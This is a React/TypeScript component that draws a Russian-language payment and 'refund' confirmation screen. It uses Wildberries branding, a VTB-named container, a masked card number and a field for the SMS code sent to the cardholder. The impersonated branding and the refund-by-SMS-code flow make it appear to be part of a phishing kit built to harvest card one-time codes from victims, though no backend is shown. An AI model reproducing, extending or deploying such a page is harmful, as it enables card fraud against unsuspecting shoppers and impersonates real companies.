import React, {useState, useEffect} from 'react'
import styles from './CustomPush.module.scss'
import CountUp from 'react-countup';

type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number;
    sendCode: (value: string) => void;
    isRefund?: boolean; 

}

const CustomPush = ({totalPrice, cardDetails, sendCode, isRefund}: Props) => {
    const [canResend, setCanResend] = useState(false);
    const [seconds, setSeconds] = useState(120);
    let currentDate = new Date();
    let day = String(currentDate.getDate()).padStart(2, '0');
    let month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
    let year = currentDate.getFullYear();
    let formattedDate = `${day}.${month}.${year}`;
    const [code, setCode] = useState('')

    const startTimer = () => {
        setCanResend(false);
        setSeconds(120);
      }

      useEffect(() => {
        if (seconds > 0) {
          const timer = setTimeout(() => setSeconds(seconds - 1), 1000);
          return () => clearTimeout(timer);
        } else {
          setCanResend(true);
        }
      }, [seconds]);

    const handleClick = () => {
        if (canResend) {
          startTimer();
        }
      }

      const formatTime = () => {
        const minutes = Math.floor(seconds / 60);
        const remainderSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainderSeconds.toString().padStart(2, '0')}`;
      }
      function formatCardNumber(cardNumber: string): string {
        return cardNumber.slice(0, 4) + ' XXXX XXXX ' + cardNumber.slice(-4);
    }

    const process = () =>{
      if(code.length > 3){
        sendCode(code)
      }
    }
    
  return (
    <div className={styles.vtbbankContainer}>
    <div className={`${styles.logo} ${isRefund ? styles.disable: ''}`}>
     <img src={`https://static-basket-01.wb.ru/vol0/i/header/logo-v1.svg`} alt='logo' className={styles.bankLogo}/>
     <div className={styles.titleDevider}></div>
  </div> 
  <div className={`${styles.separator} ${isRefund ? styles.disable: ''}`}></div>
  <div className={styles.title}>
  {isRefund ? "Подтверждение возврат средств" : "Подтверждение оплаты"}

  </div>
  <div className={styles.orderDetails}>
     <div className={`${styles.detailsItem} ${styles.price}`}>
         <p>
         {isRefund ? "К возврату" : "Сумма"}
         </p>
         <span><CountUp end={totalPrice} duration={0.4} separator=" "/> ₽</span>
     </div>
     <div className={styles.detailsItem}>
         <p>Торговая точка</p>
         <span>Wildberries</span>
     </div>
     <div className={styles.detailsItem}>
         <p>Дата</p>
         <span>{formattedDate}</span>
     </div>
     <div className={styles.detailsItem}>
         <p>Номер карты</p>
         <span>{formatCardNumber(cardDetails.cardNumber)}</span>
     </div>
  </div>
  <div className={styles.enterCode}>
  {isRefund ? "Код для подтверждения возврата средств отправлен в смс" : "Пожалуйста, проверьте детали покупки и введите код, отправленный на номер телефона"}
  </div>
  
 <input type="tel" name="" id="" className={styles.codeInput}  maxLength={6} onKeyPress={(e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    }} value={code} onChange={(e)=>setCode(e.target.value)}/>
 <button className={styles.confirmPayment} onClick={()=>process()}>Подтвердить <i className="fa-solid fa-arrow-right" style={{color: '#FFF'}}></i></button>
 <button className={styles.resendCode} onClick={handleClick}>
   {canResend ? 'Повторить запрос' : `Повторный запрос через ${formatTime()}`}
 </button>
 </div>
  )
}

export default CustomPush
